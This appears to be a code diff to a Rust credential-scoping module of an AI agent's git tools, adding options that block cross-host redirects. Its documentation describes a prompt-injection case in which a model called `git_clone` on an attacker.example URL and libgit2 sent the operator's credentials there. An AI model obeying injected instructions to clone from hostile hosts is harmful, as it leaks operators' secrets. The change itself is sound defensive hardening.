@@ -2,9 +2,9 @@
 //!
 //! The credentials are startup parameters — the forge password or token the operator gave
 //! this client for the repository it was opened on. libgit2 asks for them through a
-//! callback that names the URL being contacted, and until September 2026 the callback
-//! ignored that URL: `git_clone`, `git_fetch` and `git_pull` are open to the model (only
-//! pushes are gated by `allow_remote_writes`), so a model answering a prompt-injected
+//! callback that names the remote's URL, and until September 2026 the callback ignored
+//! that URL: `git_clone`, `git_fetch` and `git_pull` are open to the model (only pushes are
+//! gated by `allow_remote_writes`), so a model answering a prompt-injected
 //! `git_clone {"url": "https://attacker.example/x.git"}` met a 401 there and libgit2
 //! posted the operator's credentials to it.
 //!
@@ -12,8 +12,18 @@
 //! client's `remote_addr`, or of the opened repository's `origin` remote when
 //! `remote_addr` is a local path — and the callback refuses, by name, to offer them to any
 //! other. A client whose credentials cannot be bound to a host offers them nowhere.
+//!
+//! The URL libgit2 hands the callback is the remote's *original* URL, not the server it is
+//! talking to after a redirect, so the callback alone cannot see a redirect to another
+//! host: a bound forge answering 302 to `attacker.example` would have the attacker's 401
+//! answered with the operator's credentials. [`fetch_options`] and [`push_options`] are
+//! therefore the only way this client builds options for a network operation, and both
+//! set [`RemoteRedirect::None`]: libgit2 then refuses a redirect to any other host,
+//! before connecting to it. libgit2 compares hosts only, so a redirect to another port or
+//! path on the same host is still followed; the credential then reaches a server on the
+//! host the operator bound it to.
 
-use git2::{Cred, RemoteCallbacks};
+use git2::{Cred, FetchOptions, PushOptions, RemoteCallbacks, RemoteRedirect};
 use tracing::warn;
 
 /// A username/password pair and the one origin it may be offered to.
@@ -132,4 +142,21 @@ pub fn remote_callbacks(scope: Option<&CredentialScope>) -> RemoteCallbacks<'sta
         });
     }
     callbacks
+}
+
+/// Options for a fetch or clone: [`remote_callbacks`] for `scope`, and no redirect to
+/// another host (see the module documentation for why the callback alone is not enough).
+pub fn fetch_options(scope: Option<&CredentialScope>) -> FetchOptions<'static> {
+    let mut options = FetchOptions::new();
+    options.remote_callbacks(remote_callbacks(scope));
+    options.follow_redirects(RemoteRedirect::None);
+    options
+}
+
+/// Options for a push: [`remote_callbacks`] for `scope`, and no redirect to another host.
+pub fn push_options(scope: Option<&CredentialScope>) -> PushOptions<'static> {
+    let mut options = PushOptions::new();
+    options.remote_callbacks(remote_callbacks(scope));
+    options.follow_redirects(RemoteRedirect::None);
+    options
 }
